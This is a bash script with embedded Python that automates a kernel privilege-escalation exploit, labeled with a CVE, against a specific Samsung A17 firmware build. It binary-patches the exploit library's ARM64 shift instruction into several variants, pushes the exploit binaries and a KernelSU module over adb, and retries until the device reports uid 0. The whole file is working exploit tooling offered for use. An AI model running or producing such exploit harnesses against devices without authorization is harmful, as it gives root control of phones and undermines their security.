#!/bin/bash
# probe-shift-a17.sh
# Run from ~/17a on your Mac. Tries SLIDE_PSELECT_WORD_SHIFT 0-6 in order.
# Pushes the matching pre-patched binary, runs the exploit, waits for outcome.
# On reboot it reconnects adb and tries the next value automatically.
# Usage: bash tools/probe-shift-a17.sh

set -e

REPO="$(cd "$(dirname "$0")/.." && pwd)"
SCRATCHPAD="$REPO/tools/.probe-shift-scratch"
WORK="/data/local/tmp/a17-exploit"
SCRIPT_DEVICE="/data/local/tmp/auto-a17-A176BXXU5CZE9.sh"

SHIFTS=(0 1 2 4 5 6)

# Pre-patched binaries (generated offline; copy them here before running)
SO_PREFIX="$REPO/tools/probe-binaries"

log()  { echo "[*] $*"; }
ok()   { echo "[+] $*"; }
err()  { echo "[!] $*" >&2; exit 1; }

adb_wait_online() {
    log "Waiting for device to come online..."
    local attempts=0
    while ! adb get-state 2>/dev/null | grep -q "device"; do
        sleep 3
        attempts=$((attempts + 1))
        if [ $attempts -gt 60 ]; then
            err "Device did not come back online after 3 minutes"
        fi
    done
    # Extra wait for boot to settle
    sleep 10
    ok "Device online"
}

check_root() {
    adb shell "su -c 'id' 2>/dev/null" 2>/dev/null | grep -q "uid=0"
}

# Verify pre-patched binaries exist
if [ ! -d "$SO_PREFIX" ]; then
    log "Generating patched binaries from repo binary..."
    mkdir -p "$SO_PREFIX"
    python3 - << PYEOF
import struct, shutil, os

src = "$REPO/artifacts/a17-A176BXXU5CZE9/cve-2026-43499-app.so"
# The original has SHIFT=3 hardcoded; find the add w0,w0,#3 instruction
# We accept any current baked-in value and patch it
orig = open(src, 'rb').read()
data = bytearray(orig)

# Find slide_pselect_global_word: add w0, w0, #N pattern
# ARM64 add w0,w0,#N = 0x11000000 | (N<<10), LE bytes
import re
found = None
for n in range(16):
    pattern = struct.pack('<I', 0x11000000 | (n << 10))
    ret_pattern = b'\xc0\x03\x5f\xd6'  # ret
    idx = orig.find(pattern)
    while idx >= 0:
        if orig[idx+4:idx+8] == ret_pattern:
            found = (idx, n)
            break
        idx = orig.find(pattern, idx+1)
    if found:
        break

if not found:
    print("ERROR: could not locate slide_pselect_global_word instruction")
    exit(1)

print(f"Found SHIFT={found[1]} at offset 0x{found[0]:x}")

for shift in [0, 1, 2, 4, 5, 6]:
    dst = f"$SO_PREFIX/app-shift{shift}.so"
    d = bytearray(orig)
    new_instr = struct.pack('<I', 0x11000000 | (shift << 10))
    d[found[0]:found[0]+4] = new_instr
    open(dst, 'wb').write(bytes(d))
    print(f"  shift={shift} → {dst}")
PYEOF
fi

# Push static files (only needs to happen once)
log "Setting up device working directory..."
adb_wait_online
adb shell "mkdir -p $WORK"
adb push "$REPO/artifacts/a17-A176BXXU5CZE9/cve-2026-43499-root" "$WORK/cve-2026-43499-root" 2>/dev/null || true
adb push "$REPO/artifacts/a17-A176BXXU5CZE9/ksud"                "$WORK/ksud"                 2>/dev/null || true
adb push "$REPO/artifacts/a17-A176BXXU5CZE9/kernelsu.ko"         "$WORK/kernelsu.ko"           2>/dev/null || true
adb push "$REPO/tools/auto-a17-A176BXXU5CZE9.sh"                 "$SCRIPT_DEVICE"              2>/dev/null || true

for shift in "${SHIFTS[@]}"; do
    SO="$SO_PREFIX/app-shift${shift}.so"
    if [ ! -f "$SO" ]; then
        log "No binary for shift=$shift, skipping"
        continue
    fi

    log "============================================"
    log "Trying SLIDE_PSELECT_WORD_SHIFT=$shift"
    log "============================================"

    adb_wait_online
    adb push "$SO" "$WORK/cve-2026-43499-app.so"
    adb shell "chmod 755 $WORK/cve-2026-43499-app.so"

    log "Running exploit (shift=$shift)..."
    # Run in background; capture output until device disconnects or root found
    adb shell "sh $SCRIPT_DEVICE" &
    ADB_PID=$!

    RESULT="unknown"
    WAIT=0
    while kill -0 $ADB_PID 2>/dev/null; do
        sleep 5
        WAIT=$((WAIT + 5))
        if check_root; then
            RESULT="rooted"
            break
        fi
        if [ $WAIT -gt 300 ]; then
            RESULT="timeout"
            break
        fi
    done

    kill $ADB_PID 2>/dev/null || true
    wait $ADB_PID 2>/dev/null || true

    if [ "$RESULT" = "rooted" ]; then
        ok "ROOT ACHIEVED with SLIDE_PSELECT_WORD_SHIFT=$shift"
        ok "Update target.h: #define SLIDE_PSELECT_WORD_SHIFT $shift"
        exit 0
    fi

    log "shift=$shift did not root (result=$RESULT) — waiting for reboot recovery..."
    # Give device time to reboot
    sleep 15
done

err "All shift values tried, none achieved root. Check dmesg or try SLIDE_MAX_ATTEMPTS."
